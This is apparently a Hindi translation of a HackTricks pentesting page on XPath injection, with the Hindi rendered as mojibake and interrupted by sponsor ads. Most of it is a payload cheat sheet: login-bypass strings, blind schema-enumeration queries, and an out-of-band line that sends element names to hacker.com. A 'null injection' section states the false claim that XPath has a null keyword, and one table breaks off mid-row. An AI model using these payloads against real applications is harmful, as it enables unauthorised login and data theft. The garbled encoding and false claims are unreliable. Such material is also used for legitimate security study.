# XPATH рдЕрднрд┐рдХреНрд░рд┐рдпрд╛

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ**

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рд╕рднреА рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдХреЗ рд▓рд┐рдП рдШрд░ рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рдХреЗрд╡рд▓ рддрдм рд╢реБрд░реВ рд╣реЛрддреЗ рд╣реИрдВ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдЗрдирд╛рдо рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдмрдЧ рд╕рддреНрдпрд╛рдкрд┐рдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдЖрдкрдХреЛ рдЗрдирд╛рдо рдорд┐рд▓реЗрдЧрд╛ред

**рд╡реЗрдм3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЙрдирдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ рд╡реЗрдм3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**рд╡реЗрдм3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддреНрдпреЗрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

## **рдореВрд▓ рд╡рд╛рдХреНрдпрд╛рдВрд╢**

XPath Injection рдПрдХ рд╣рдорд▓рд╛ рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рдЗрдирдкреБрдЯ рд╕реЗ XPath (XML рдкрде рднрд╛рд╖рд╛) рдХреНрд╡реЗрд░реА рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рднрдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╛ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдХреЛ рдХреНрд╡реЗрд░реА рдпрд╛ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдХреНрд╡реЗрд░реА рдХреИрд╕реЗ рдмрдирд╛рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА: [https://www.w3schools.com/xml/xpath\_syntax.asp](https://www.w3schools.com/xml/xpath\_syntax.asp)

### рдиреЛрдб

| рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ | рд╡рд┐рд╡рд░рдг                                                                                                 |
| ---------- | ----------------------------------------------------------------------------------------------------- |
| рдиреЛрдбрдирд╛рдо    | "рдиреЛрдбрдирд╛рдо" рдирд╛рдо рдХреЗ рд╕рднреА рдиреЛрдб рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ                                                            |
| /          | рд░реВрдЯ рдиреЛрдб рд╕реЗ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ                                                                               |
| //         | рд╡рд░реНрддрдорд╛рди рдиреЛрдб рд╕реЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рд╕рднреА рдиреЛрдб рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдЪрдпрди рд╕реЗ рдореЗрд▓ рдЦрд╛рддреЗ рд╣реИрдВ, рдЪрд╛рд╣реЗ рд╡реЗ рдХрд╣реАрдВ рднреА рд╣реЛрдВ |
| .          | рд╡рд░реНрддрдорд╛рди рдиреЛрдб рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ                                                                           |
| ..         | рд╡рд░реНрддрдорд╛рди рдиреЛрдб рдХреЗ рдорд╛рддрд╛-рдкрд┐рддрд╛ рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ                                                             |
| @          | рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ                                                                             |

### **рдЙрджрд╛рд╣рд░рдг:**

| рдкрде рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ | рдкрд░рд┐рдгрд╛рдо                                                                                                                                 |
| --------------- | -------------------------------------------------------------------------------------------------------------------------------------- |
| рдкреБрд╕реНрддрдХрд╛рд▓рдп       | "рдкреБрд╕реНрддрдХрд╛рд▓рдп" рдирд╛рдо рдХреЗ рд╕рднреА рдиреЛрдб рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ                                                                                            |
| /рдкреБрд╕реНрддрдХрд╛рд▓рдп      | рд░реВрдЯ рддрддреНрд╡ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ**рдиреЛрдЯ:** рдпрджрд┐ рдкрде рд╕реНрд▓реИрд╢ (/) рд╕реЗ рд╢реБрд░реВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рд╣рдореЗрд╢рд╛ рдПрдХ рддрддреНрд╡ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреВрд░реНрдг рдорд╛рд░реНрдЧ рдХрд╛ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХрд░рддрд╛ рд╣реИ! |
| рдкреБрд╕реНрддрдХрд╛рд▓рдп/рдкреБрд╕реНрддрдХ  | рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХреЗ рдмрдЪреНрдЪреЗ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдкреБрд╕реНрддрдХ рддрддреНрд╡реЛрдВ рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ                                                                               |
| //рдкреБрд╕реНрддрдХ          | рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рдХрд╣реАрдВ рднреА рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдкреБрд╕реНрддрдХ рддрддреНрд╡реЛрдВ рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ                                                                         |
| рдкреБрд╕реНрддрдХрд╛рд▓рдп//рдкреБрд╕реНрддрдХ | рдкреБрд╕реНрддрдХрд╛рд▓рдп рддрддреНрд╡ рдХреЗ рдиреАрдЪреЗ рдХрд╣реАрдВ рднреА рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╕рднреА рдкреБрд╕реНрддрдХ рддрддреНрд╡реЛрдВ рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ                                                                     |
| //@рднрд╛рд╖рд╛         | "рднрд╛рд╖рд╛" рдирд╛рдо рдХреЗ рд╕рднреА рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХрд╛ рдЪ
### **рдЙрджрд╛рд╣рд░рдг:**

| рдкрд╛рде рд╡реНрдпрдХреНрддрд┐ | рдкрд░рд┐рдгрд╛рдо                                                                   |
| --------------- | ------------------------------------------------------------------------ |
| /bookstore/\*   | рдмреБрдХрд╕реНрдЯреЛрд░ рддрддреНрд╡ рдХреЗ рд╕рднреА рдЪрд╛рдЗрд▓реНрдб рддрддреНрд╡ рдиреЛрдб рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ             |
| //\*            | рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдореЗрдВ рд╕рднреА рддрддреНрд╡реЛрдВ рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ                                     |
| //title\[@\*]   | рдХрдо рд╕реЗ рдХрдо рдПрдХ рдРрд╕реЗ рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрд┐рд╕реА рднреА рдЧреБрдг рдХреЗ рд╕рд╛рде рд╕рднреА рд╢реАрд░реНрд╖рдХ рддрддреНрд╡реЛрдВ рдХрд╛ рдЪрдпрди рдХрд░рддрд╛ рд╣реИ |

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof рд╕рднреА рдХреНрд░рд┐рдкреНрдЯреЛ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдХреЗ рд▓рд┐рдП рдШрд░ рд╣реИред**

**рджреЗрд░реА рдХреЗ рдмрд┐рдирд╛ рдкреБрд░рд╕реНрдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
HackenProof рдмрд╛рдЙрдВрдЯреА рдХреЗрд╡рд▓ рддрдм рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ рдЬрдм рдЙрдирдХреЗ рдЧреНрд░рд╛рд╣рдХ рдкреБрд░рд╕реНрдХрд╛рд░ рдмрдЬрдЯ рдЬрдорд╛ рдХрд░рддреЗ рд╣реИрдВред рдЖрдкрдХреЛ рдкреБрд░рд╕реНрдХрд╛рд░ рдЙрд╕ рдмрдЧ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдорд┐рд▓реЗрдЧрд╛ред

**Web3 рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдореЗрдВ рдЕрдиреБрднрд╡ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**\
рдмреНрд▓реЙрдХрдЪреЗрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдФрд░ рд╕реНрдорд╛рд░реНрдЯ рдХреЙрдиреНрдЯреНрд░реИрдХреНрдЯреНрд╕ рдирдИ рдЗрдВрдЯрд░рдиреЗрдЯ рд╣реИрдВ! рдЙрдирдХреЗ рдЙрднрд░рддреЗ рджрд┐рдиреЛрдВ рдореЗрдВ рд╡реЗрдм3 рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдорд╛рд╕реНрдЯрд░ рдХрд░реЗрдВред

**Web3 рд╣реИрдХрд░ рд▓реАрдЬреЗрдВрдб рдмрдиреЗрдВ**\
рдкреНрд░рддреНрдпреЗрдХ рд╕рддреНрдпрд╛рдкрд┐рдд рдмрдЧ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╖реНрдард╛ рдЕрдВрдХ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдкреНрддрд╛рд╣рд┐рдХ рд▓реАрдбрд░рдмреЛрд░реНрдб рдХреЗ рд╢реАрд░реНрд╖ рдкрд░ рд╡рд┐рдЬрдпреА рдмрдиреЗрдВред

[**HackenProof рдкрд░ рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ**](https://hackenproof.com/register) рдФрд░ рдЕрдкрдиреЗ рд╣реИрдХреНрд╕ рд╕реЗ рдХрдорд╛рдИ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://hackenproof.com/register" %}

## рдЙрджрд╛рд╣рд░рдг
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
<name>pepe</name>
<password>peponcio</password>
<account>admin</account>
</user>
<user>
<name>mark</name>
<password>m12345</password>
<account>regular</account>
</user>
<user>
<name>fino</name>
<password>fino2</password>
<account>regular</account>
</user>
</data>
```
### рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪреЗрдВ

XPath Injection рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣рдо рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдПрдХ рдЕрджреНрдпрддрд┐рдд рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо XPath рдХреНрд╡реЗрд░реА рдХреЛ рдЕрджреНрдпрддрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╡реЗрдм рдлрд╝реЙрд░реНрдо рдпрд╛ рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдПрдХ рдЕрджреНрдпрддрд┐рдд XPath рдХреНрд╡реЗрд░реА рджрд░реНрдЬ рдХрд░рдиреА рд╣реЛрдЧреАред рдпрджрд┐ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдЗрд╕ рдХреНрд╡реЗрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЗ рд╕рд╛рде рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ, рддреЛ рд╣рдо рдЙрд╕ рдХреНрд╡реЗрд░реА рдХреЛ рдЕрджреНрдпрддрд┐рдд рдХрд░рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ рдХреБрдЫ рдЯреЗрд╕реНрдЯ рдХреНрд╡реЗрд░реА рдкреНрд░рджрд╛рди рдХрд░рдиреА рд╣реЛрдЧреА рдЬреЛ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдирд╣реАрдВ рдХреА рдЬрд╛рддреА рд╣реИ рдФрд░ рд╣рдореЗрдВ рд╡рд╛рдкрд╕ рд╕рдВрд╢реЛрдзрд┐рдд рдХреНрд╡реЗрд░реА рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреЛ рджреЗрдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдЗрд╕рдХреЗ рдмрд╛рдж, рд╣рдореЗрдВ рдЙрд╕ рдХреНрд╡реЗрд░реА рдХреЛ рдЕрджреНрдпрддрд┐рдд рдХрд░рдХреЗ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ XPath Injection рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдореЗрдВ рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХреНрд╡реЗрд░реА рдХреЛ рдЕрджреНрдпрддрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рдиреА рдЪрд╛рд╣рд┐рдПред рдЗрд╕рд▓рд┐рдП, рдпрд╣ рддрдХрдиреАрдХ рдХреЗрд╡рд▓ рдЙрди рдРрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдкрд░ рдХрд╛рдо рдХрд░реЗрдЧреА рдЬрд┐рдирдореЗрдВ рдЗрд╕ рддрд░рд╣ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред
```
All names - [pepe, mark, fino]
name
//name
//name/node()
//name/child::node()
user/name
user//name
/user/name
//user/name

All values - [pepe, peponcio, admin, mark, ...]
//user/node()
//user/child::node()


Positions
//user[position()=1]/name #pepe
//user[last()-1]/name #mark
//user[position()=1]/child::node()[position()=2] #peponcio (password)

Functions
count(//user/node()) #3*3 = 9 (count all values)
string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
```
### рдпреЛрдЬрдирд╛ рдХреА рдкрд╣рдЪрд╛рди рдФрд░ рдЪреЛрд░реА

XPath injection allows an attacker to manipulate the XPath query used by a web application to extract data from an XML document. By injecting malicious input into the XPath query, an attacker can modify the query to retrieve sensitive information, such as the database schema.

XPath рдЕрднрд┐рдХреНрд░рд┐рдпрд╛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА XPath рдХреНрд╡реЗрд░реА рдХреЛ рдорд╛рдирд┐рдкреБрд░реЗрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬрд┐рд╕рд╕реЗ XML рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рд╛ рдЬрд╛рддрд╛ рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдорд╛рд▓рд┐рд╢рд┐рдпрд╕ рдЗрдирдкреБрдЯ рдХреЛ XPath рдХреНрд╡реЗрд░реА рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдХреЗ, рдХреНрд╡реЗрд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рдЙрд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА, рдЬреИрд╕реЗ рдбреЗрдЯрд╛рдмреЗрд╕ рдпреЛрдЬрдирд╛, рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```python
and count(/*) = 1 #root
and count(/*[1]/*) = 2 #count(root) = 2 (a,c)
and count(/*[1]/*[1]/*) = 1 #count(a) = 1 (b)
and count(/*[1]/*[1]/*[1]/*) = 0 #count(b) = 0
and count(/*[1]/*[2]/*) = 3 #count(c) = 3 (d,e,f)
and count(/*[1]/*[2]/*[1]/*) = 0 #count(d) = 0
and count(/*[1]/*[2]/*[2]/*) = 0 #count(e) = 0
and count(/*[1]/*[2]/*[3]/*) = 1 #count(f) = 1 (g)
and count(/*[1]/*[2]/*[3]/[1]*) = 0 #count(g) = 0

#The previous solutions are the representation of a schema like the following
#(at this stage we don't know the name of the tags, but jus the schema)
<root>
<a>
<b></b>
</a>
<c>
<d></d>
<e></e>
<f>
<h></h>
</f>
</c>
</root>

and name(/*[1]) = "root" #Confirm the name of the first tag is "root"
and substring(name(/*[1]/*[1]),1,1) = "a" #First char of name of tag `<a>` is "a"
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105 #Firts char of tag `<b>`is codepoint 105 ("i") (https://codepoints.net/)

#Stealing the schema via OOB
doc(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
```
## рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдмрд╛рдИрдкрд╛рд╕

### **рдкреНрд░рд╢реНрдиреЛрдВ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:**
```
string(//user[name/text()='+VAR_USER+' and password/text()='+VAR_PASSWD+']/account/text())
$q = '/usuarios/usuario[cuenta="' . $_POST['user'] . '" and passwd="' . $_POST['passwd'] . '"]';
```
### **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ OR рдмрд╛рдЗрдкрд╛рд╕ (рджреЛрдиреЛрдВ рдореЗрдВ рд╕рдорд╛рди рдорд╛рди)**

If the application is vulnerable to XPath injection and the user and password fields are concatenated in the query, it is possible to bypass the login by injecting an XPath expression that evaluates to true. This can be achieved by providing the same value in both the user and password fields.

рдпрджрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди XPath рдЕрдкрд╡рд╛рдж рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрдХреНрд░рдорд┐рдд рд╣реИ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдлрд╝реАрд▓реНрдб рдХреЛ рдХреНрд╡реЗрд░реА рдореЗрдВ рдЬреЛрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд▓реЙрдЧрд┐рди рдХреЛ рдмрд╛рдЗрдкрд╛рд╕ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ XPath рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдХреЛ рд╕рддреНрдп рдорд╛рдирддрд╛ рд╣реИред рдЗрд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдлрд╝реАрд▓реНрдб рдореЗрдВ рдПрдХ рд╣реА рдорд╛рди рдкреНрд░рджрд╛рди рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```
' or '1'='1
" or "1"="1
' or ''='
" or ""="
string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())

Select account
Select the account using the username and use one of the previous values in the password field
```
### **рдирд▓ рдЕрднрд┐рдпрд╛рдВрддреНрд░рд┐рдХреА рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ**

Null injection is a technique used in XPath injection attacks to bypass input validation and manipulate the XPath query. In XPath, the null value is represented by the `null` keyword. By injecting a null value into the XPath query, an attacker can modify the query's logic and potentially extract sensitive information.

To abuse null injection, an attacker needs to identify a vulnerable input field that is used in an XPath query. The attacker can then append the `null` keyword to the input value, causing the query to evaluate to true regardless of the original condition.

For example, consider the following vulnerable XPath query:

```xml
//users/user[name='admin' and password='input']
```

By injecting a null value into the password field, the attacker can bypass the password check and retrieve the information for the "admin" user:

```xml
//users/user[name='admin' and password=null]
```

It is important to note that null injection may not always work, as it depends on the specific implementation and validation of the XPath query. Additionally, null injection can be combined with other techniques, such as boolean-based blind injection, to further exploit the vulnerability.

To prevent null injection attacks, it is crucial to properly validate and sanitize user input before using it in XPath queries. Input validation should include checking for the presence of null values and applying appropriate filters or encoding techniques to mitigate the risk of injection attacks.
```
Username: ' or 1]%00
```
### **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдореЗрдВ рдбрдмрд▓ OR** (рдХреЗрд╡рд▓ 1 рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рдлрд╝реАрд▓реНрдб рдХреЗ рд╕рд╛рде рдорд╛рдиреНрдп рд╣реИ)

рдорд╣рддреНрд╡рдкреВрд░реНрдг: рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **"рдФрд░" рдкрд╣рд▓реА рдХреНрд░рд┐рдпрд╛ рд╣реИ**ред
```
Bypass with first match
(This requests are also valid without spaces)
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
string(//user[name/text()='' or true() or '' and password/text()='']/account/text())

Select account
'or string-length(name(.))<10 or' #Select account with length(name)<10
'or contains(name,'adm') or' #Select first account having "adm" in the name
'or contains(.,'adm') or' #Select first account having "adm" in the current value
'or position()=2 or' #Select 2┬║ account
string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())

Select account (name known)
admin' or '
admin' or '1'='2
string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
```
## рд╕реНрдЯреНрд░рд┐рдВрдЧ рдирд┐рд╖реНрдХрд░реНрд╖рдг

